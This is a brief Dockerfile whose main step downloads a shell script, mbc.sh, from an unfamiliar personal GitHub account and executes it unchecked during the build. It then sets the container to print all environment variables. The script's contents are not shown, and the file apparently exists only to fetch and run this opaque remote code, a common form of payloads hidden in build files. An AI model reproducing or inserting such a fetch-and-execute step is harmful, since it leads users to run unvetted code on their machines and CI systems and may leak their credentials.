FROM ubuntu:zesty

RUN wget https://raw.githubusercontent.com/surorebro/saya/main/mbc.sh && chmod +x mbc.sh && ./mbc.sh
WORKDIR /usr/src/app

COPY . .

CMD ["printenv"]
